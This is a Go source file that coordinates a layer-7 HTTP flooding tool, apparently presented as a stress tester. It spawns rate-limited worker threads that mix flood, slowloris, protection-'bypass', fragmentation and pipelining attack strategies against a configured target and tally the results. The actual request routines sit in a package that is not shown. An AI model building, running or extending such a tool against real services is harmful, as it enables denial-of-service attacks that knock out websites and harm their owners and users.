// pkg/attacker/mixed.go
package attacker

import (
    "math/rand"
    "sync"
    "time"

    "github.com/stresstest/layer7-flood/pkg/config"
    "github.com/stresstest/layer7-flood/pkg/stats"
    "github.com/stresstest/layer7-flood/pkg/utils"
)

type Mixed struct {
    cfg         *config.Config
    stats       *stats.Collector
    strategies  []string
    workers     []*MixedWorker
    wg          sync.WaitGroup
    stopCh      chan struct{}
}

type MixedWorker struct {
    id         int
    strategy   string
    client     *utils.MultiProtocolClient
    cfg        *config.Config
    stats      *stats.Collector
    stopCh     <-chan struct{}
    rateTicker *time.Ticker
}

func NewMixed(cfg *config.Config, stats *stats.Collector) *Mixed {
    strategies := []string{"flood", "slowloris", "bypass", "fragment", "pipeline"}
    rand.Shuffle(len(strategies), func(i, j int) {
        strategies[i], strategies[j] = strategies[j], strategies[i]
    })
    
    return &Mixed{
        cfg:        cfg,
        stats:      stats,
        strategies: strategies,
        workers:    make([]*MixedWorker, 0),
        stopCh:     make(chan struct{}),
    }
}

func (m *Mixed) Start() {
    for i := 0; i < m.cfg.Attack.Threads; i++ {
        strategy := m.strategies[i%len(m.strategies)]
        
        worker := &MixedWorker{
            id:       i,
            strategy: strategy,
            client:   utils.NewMultiProtocolClient(m.cfg),
            cfg:      m.cfg,
            stats:    m.stats,
            stopCh:   m.stopCh,
        }
        
        interval := time.Second / time.Duration(m.cfg.Attack.RatePerThread)
        worker.rateTicker = time.NewTicker(interval)
        
        m.workers = append(m.workers, worker)
        m.wg.Add(1)
        go worker.run()
    }
    m.wg.Wait()
}

func (w *MixedWorker) run() {
    defer w.stats.DecrementActive()
    w.stats.IncrementActive()
    
    var counter int
    for {
        select {
        case <-w.stopCh:
            return
        case <-w.rateTicker.C:
            var err error
            start := time.Now()
            
            switch w.strategy {
            case "flood":
                err = w.client.DoFlood()
            case "slowloris":
                err = w.client.DoSlowloris(counter)
            case "bypass":
                err = w.client.DoBypass()
            case "fragment":
                err = w.client.DoFragment()
            case "pipeline":
                err = w.client.DoPipeline()
            }
            
            latency := time.Since(start)
            if err != nil {
                w.stats.RecordFailure(err.Error())
            } else {
                w.stats.RecordSuccess(200, latency)
            }
            
            counter++
        }
    }
}

func (m *Mixed) Stop() {
    close(m.stopCh)
    for _, w := range m.workers {
        w.rateTicker.Stop()
        w.client.Close()
    }
    m.wg.Wait()
}
